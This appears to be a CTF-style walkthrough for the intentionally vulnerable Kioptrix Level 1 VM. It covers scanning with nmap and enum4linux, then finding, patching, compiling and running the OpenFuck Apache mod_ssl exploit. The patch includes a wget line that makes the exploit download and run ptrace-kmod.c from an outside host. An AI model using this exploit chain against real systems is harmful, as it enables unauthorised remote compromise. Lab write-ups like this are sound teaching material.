# kioptrix-full-walkthrough
<h1>Kioptrix Level 1</h1>

Step 1:
Downloading machine and setting up.

Step 2:
Run netdiscover to learn the machine IP.
>sudo netdiscover -i eth0

![image](https://user-images.githubusercontent.com/31168741/199799872-1a04ded4-b40c-4cae-b085-f970aee67bd2.png)

Note: Found out by the mac address.

Step 3:
Run nmap scan on the machine IP that we found.

>sudo nmap -sS -A -p- <i><b>[machine-ip]</b></i> -T4

![image](https://user-images.githubusercontent.com/31168741/199800031-894a8f69-a2f0-4585-8d1f-84a3fceba8c4.png)
![image](https://user-images.githubusercontent.com/31168741/199800056-715a15f8-f636-40f8-801f-0a477a7fef28.png)
nmap result as found above!

Step 4:
Running some other tools to enumerate as much information as possible from the machine.

>enum4linux <i><b>[machine-ip]</b></i>

>dirb http://<i><b>[machine-ip]</b></i>

Step 5:
Now we browse for available exploits.

As shown in the output, the target system is using a very outdated Apache web server version 1.3.20. We Google for “apache 1.3.20 vulnerability”.

Search for the exploit via searchsploit
> searchsploit OpenFuck

![image](https://user-images.githubusercontent.com/31168741/199801410-e466b70b-3dce-477a-8ceb-eea0ec90c4aa.png)

<h2>Modify the exploit code:</h2>

Simply make a copy of the <b>764.c</b> exploit and put it somewhere to check it out and make changes to it (because the ‘off-the-shell’ code over there is pretty outdated)

> cp /usr/share/exploitdb/exploits/unix/remote/764.c OpenFuck.c

Here, we need to make some modification to the code before compiling it. Can be done using any text editor such as nano or vim.

> vim OpenFuck.c

Below are the list of changes which are needed to be made to the <b>OpenFuck.c</b> code,

<b>Include the openssl rc4 and md5 libraries:</b>

>#include <openssl/rc4.h>

>#include <openssl/md5.h>

Modify the <b>‘wget’</b> method in the exploit itself because the url does not exist anymore. we need to update it to become the new URL to download the file.
Search for <b>‘wget’</b> in the exploit, and then replace the URL to <b>http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</b>

<b>Install Libraries for compiling the modified exploit code:</b>

> apt-get install libssl-dev

> gcc -o OpenFuck OpenFuck.c -lcrypto

Running the exploit,

>./OpenFuck 0x6b <i><b>[machine-ip]</b></i> 443 -c 40

![image](https://user-images.githubusercontent.com/31168741/199802750-a1c211c4-c945-4549-bc19-98446b53831b.png)

It worked!

<h1>Kioptrix Level 1.1(2)</h1>

